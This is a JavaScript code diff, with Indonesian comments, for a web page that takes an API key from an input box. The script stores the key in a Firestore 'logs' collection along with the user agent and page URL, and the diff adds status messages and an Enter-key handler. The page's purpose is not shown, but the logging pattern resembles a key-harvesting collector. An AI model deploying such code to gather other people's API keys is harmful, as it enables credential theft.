@@ -16,28 +16,41 @@ const db = firebase.firestore();
 // ===== ELEMEN =====
 const input = document.getElementById('api-input');
 const btn = document.getElementById('enter-btn');
+const statusDiv = document.getElementById('status');
 
 // ===== FUNGSI =====
+function setStatus(text, isSuccess = true) {
+    statusDiv.textContent = text;
+    statusDiv.style.color = isSuccess ? '#00ffe0' : '#ff7b72';
+}
+
 function sendToFirestore(apiKey) {
+    setStatus('⏳ Mengirim data...', true);
     db.collection("logs").add({
         api_key: apiKey,
         timestamp: new Date().toISOString(),
-        user_agent: navigator.userAgent
+        user_agent: navigator.userAgent,
+        url: window.location.href
     })
     .then(() => {
-        alert('✅ Data terkirim ke Firestore!');
+        setStatus('✅ Data terkirim ke Firestore!', true);
     })
     .catch((error) => {
-        alert('❌ Gagal: ' + error.message);
+        setStatus('❌ Gagal: ' + error.message, false);
+        console.error("Firestore error:", error);
     });
 }
 
-// ===== EVENT TOMBOL =====
+// ===== EVENT =====
 btn.addEventListener('click', function() {
     const key = input.value.trim();
     if (key === '') {
-        alert('Masukkan API Key!');
+        setStatus('⚠️ Masukkan API Key!', false);
         return;
     }
     sendToFirestore(key);
+});
+
+input.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') btn.click();
 });
